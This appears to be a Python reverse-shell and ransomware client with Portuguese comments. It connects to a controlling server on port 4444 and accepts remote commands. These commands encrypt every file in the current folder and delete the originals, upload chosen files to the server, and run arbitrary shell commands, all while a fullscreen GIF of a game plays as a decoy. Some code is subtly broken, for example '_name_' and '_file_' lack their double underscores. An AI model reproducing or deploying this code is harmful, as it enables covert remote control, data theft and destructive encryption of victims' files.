import socket  
import os
import subprocess
import requests
import threading
import tkinter as tk
from PIL import Image, ImageTk
import sys
import platform
import time
import shutil
from cryptography.fernet import Fernet
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configurações
HOST = "127.0.0.1"  # Substitua pelo IP do servidor se necessário
PORT = 4444
TIMEOUT = 30  # segundos
CHAVE_CRIPTOGRAFIA = b'chave_secreta_do_servidor'  # Chave para criptografia

# Cores para mensagens (ANSI)
class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    END = "\033[0m"

def format_response(message, color=Colors.GREEN):
    return f"{color}{message}{Colors.END}"

def gerar_chave_criptografia():
    salt = b'salt_fixo_para_geracao_da_chave'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    chave = base64.urlsafe_b64encode(kdf.derive(CHAVE_CRIPTOGRAFIA))
    return Fernet(chave)

def criptografar_arquivo(caminho_arquivo):
    try:
        fernet = gerar_chave_criptografia()
        
        # Lê o conteúdo do arquivo
        with open(caminho_arquivo, 'rb') as arquivo:
            dados = arquivo.read()
        
        # Criptografa os dados
        dados_criptografados = fernet.encrypt(dados)
        
        # Salva o arquivo criptografado com extensão .encrypted
        novo_nome = f"{caminho_arquivo}.encrypted"
        with open(novo_nome, 'wb') as arquivo:
            arquivo.write(dados_criptografados)
        
        # Remove o arquivo original
        os.remove(caminho_arquivo)
        return True
    except Exception as e:
        print(format_response(f"[ERROR] Erro ao criptografar arquivo {caminho_arquivo}: {str(e)}", Colors.RED))
        return False

def descriptografar_arquivo(caminho_arquivo):
    try:
        if not caminho_arquivo.endswith('.encrypted'):
            return False
            
        fernet = gerar_chave_criptografia()
        
        # Lê o conteúdo do arquivo criptografado
        with open(caminho_arquivo, 'rb') as arquivo:
            dados_criptografados = arquivo.read()
        
        # Descriptografa os dados
        dados = fernet.decrypt(dados_criptografados)
        
        # Salva o arquivo descriptografado (remove a extensão .encrypted)
        novo_nome = caminho_arquivo[:-10]  # Remove .encrypted
        with open(novo_nome, 'wb') as arquivo:
            arquivo.write(dados)
        
        # Remove o arquivo criptografado
        os.remove(caminho_arquivo)
        return True
    except Exception as e:
        print(format_response(f"[ERROR] Erro ao descriptografar arquivo {caminho_arquivo}: {str(e)}", Colors.RED))
        return False

def fazer_backup():
    try:
        # Cria diretório de backup se não existir
        if not os.path.exists('backup'):
            os.makedirs('backup')
        
        # Data e hora atual para nome do backup
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        backup_dir = f"backup/backup_{timestamp}"
        
        # Copia todos os arquivos do diretório atual para o backup
        for item in os.listdir('.'):
            if item != 'backup' and not item.startswith('.'):
                if os.path.isfile(item):
                    shutil.copy2(item, backup_dir)
                elif os.path.isdir(item):
                    shutil.copytree(item, os.path.join(backup_dir, item))
        
        return True
    except Exception as e:
        print(format_response(f"[ERROR] Erro ao fazer backup: {str(e)}", Colors.RED))
        return False

def connect_server():
    try:
        s = socket.socket()
        s.settimeout(TIMEOUT)
        s.connect((HOST, PORT))
        
        print(format_response(f"[+] Conectado ao servidor {HOST}:{PORT}", Colors.BLUE))
        
        # Recebe mensagem inicial do servidor
        server_ip_message = s.recv(1024).decode().strip()
        if server_ip_message.startswith("SERVER_IP"):
            new_ip = server_ip_message.split()[1]
            print(format_response(f"[!] Servidor solicitou reconexão para: {new_ip}", Colors.YELLOW))
            s.close()
            s = socket.socket()
            s.connect((new_ip, PORT))

        while True:
            try:
                command = s.recv(4096).decode().strip()
                if not command:
                    print(format_response("[-] Conexão encerrada pelo servidor", Colors.RED))
                    break

                print(format_response(f"\n[+] Comando recebido: {command}", Colors.YELLOW))

                # Processamento de comandos
                if command.lower() == 'exit':
                    s.send(format_response("[*] Desconectando a pedido do servidor", Colors.BLUE).encode())
                    break
                    
                elif command.lower() == 'encrypt':
                    arquivos_processados = 0
                    for item in os.listdir():
                        if os.path.isfile(item) and not item.endswith('.encrypted'):
                            if criptografar_arquivo(item):
                                arquivos_processados += 1
                    s.send(format_response(f"[OK] {arquivos_processados} arquivos criptografados com sucesso", Colors.GREEN).encode())
                    
                elif command.lower() == 'decrypt':
                    arquivos_processados = 0
                    for item in os.listdir():
                        if os.path.isfile(item) and item.endswith('.encrypted'):
                            if descriptografar_arquivo(item):
                                arquivos_processados += 1
                    s.send(format_response(f"[OK] {arquivos_processados} arquivos descriptografados com sucesso", Colors.GREEN).encode())
                    
                elif command.lower() == 'backup':
                    if fazer_backup():
                        s.send(format_response("[OK] Backup realizado com sucesso", Colors.GREEN).encode())
                    else:
                        s.send(format_response("[ERROR] Falha ao realizar backup", Colors.RED).encode())
                    
                elif command.startswith("cd "):
                    path = command[3:]
                    try:
                        os.chdir(path)
                        response = format_response(f"[OK] Diretório atual: {os.getcwd()}", Colors.GREEN)
                    except Exception as e:
                        response = format_response(f"[ERROR] {str(e)}", Colors.RED)
                    s.send(response.encode())
                    
                elif command == 'ls':
                    try:
                        files = []
                        for item in os.listdir():
                            if os.path.isdir(item):
                                files.append(f"{Colors.BLUE}{item}/{Colors.END}")
                            elif os.access(item, os.X_OK):
                                files.append(f"{Colors.GREEN}{item}*{Colors.END}")
                            else:
                                files.append(item)
                        response = "\n".join(files)
                    except Exception as e:
                        response = format_response(f"[ERROR] {str(e)}", Colors.RED)
                    s.send(response.encode())
                    
                elif command.startswith("get "):
                    file_name = command[4:].strip()
                    try:
                        if not os.path.exists(file_name):
                            s.send(format_response(f"[ERROR] Arquivo não encontrado: {file_name}", Colors.RED).encode())
                            return

                        if os.path.isdir(file_name):
                            s.send(format_response(f"[ERROR] É um diretório, não um arquivo: {file_name}", Colors.RED).encode())
                            return

                        file_size = os.path.getsize(file_name)
                        s.send(format_response(f"[INFO] Iniciando transferência do arquivo: {file_name} ({file_size} bytes)", Colors.BLUE).encode())

                        with open(file_name, 'rb') as f:
                            while True:
                                chunk = f.read(4096)  # Lê em chunks de 4KB
                                if not chunk:
                                    s.send(b"<EOF>")  # Marcador de fim de arquivo
                                    print(format_response(f"[+] Arquivo {file_name} enviado com sucesso", Colors.GREEN))
                                    break
                                try:
                                    s.sendall(chunk)
                                except (socket.error, ConnectionResetError) as e:
                                    print(format_response(f"[!] Erro durante transferência: {e}", Colors.RED))
                                    break
                    except PermissionError:
                        s.send(format_response(f"[ERROR] Permissão negada para ler o arquivo: {file_name}", Colors.RED).encode())
                    except Exception as e:
                        s.send(format_response(f"[ERROR] Erro inesperado: {str(e)}", Colors.RED).encode())
                        
                elif command.startswith("exec "):
                    cmd = command[5:]
                    try:
                        output = subprocess.check_output(
                            cmd, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            timeout=60,
                            universal_newlines=True
                        )
                        s.send(output.encode())
                    except subprocess.TimeoutExpired:
                        s.send(format_response("[ERROR] Comando expirou após 60 segundos", Colors.RED).encode())
                    except subprocess.CalledProcessError as e:
                        s.send(format_response(f"[ERROR] {e.output}", Colors.RED).encode())
                    except Exception as e:
                        s.send(format_response(f"[ERROR] {str(e)}", Colors.RED).encode())
                        
                else:
                    s.send(format_response("[ERROR] Comando desconhecido", Colors.RED).encode())
                    print(format_response(f"Comando não reconhecido: {command}", Colors.YELLOW))

                    
            except socket.timeout:
                print(format_response("[!] Timeout aguardando comando", Colors.YELLOW))
                break
            except Exception as e:
                print(format_response(f"[!] Erro durante execução: {e}", Colors.RED))
                break
                
    except Exception as e:
        print(format_response(f"[!] Erro na conexão: {e}", Colors.RED))
    finally:
        s.close()
        print(format_response("[*] Conexão encerrada", Colors.BLUE))

def show_gif():
    root = tk.Tk()
    root.title("Conexão Ativa")
    root.attributes('-fullscreen', True)
    root.configure(background='black')

    try:
        # Caminho do GIF (para .exe ou script)
        if getattr(sys, 'frozen', False):
            base_dir = sys._MEIPASS
        else:
            base_dir = os.path.dirname(os.path.abspath(_file_))
        
        gif_path = os.path.join(base_dir, "gtasa.gif")
        
        if not os.path.exists(gif_path):
            raise FileNotFoundError(f"Arquivo {gif_path} não encontrado")

        image = Image.open(gif_path)
        frames = []
        for i in range(image.n_frames):
            image.seek(i)
            frame = ImageTk.PhotoImage(image.copy())
            frames.append(frame)

        label = tk.Label(root)
        label.pack()

        current_frame = 0
        def update_frame():
            nonlocal current_frame
            label.config(image=frames[current_frame])
            current_frame = (current_frame + 1) % len(frames)
            root.after(50, update_frame)  # Ajuste a velocidade aqui

        update_frame()
        root.mainloop()
    except Exception as e:
        print(format_response(f"[!] Erro ao carregar o GIF: {e}", Colors.RED))
        root.destroy()

if _name_ == "_main_":
    # Inicia a conexão em uma thread
    server_thread = threading.Thread(target=connect_server)
    server_thread.daemon = True
    server_thread.start()

    # Exibe o GIF em tela cheia
    show_gif()
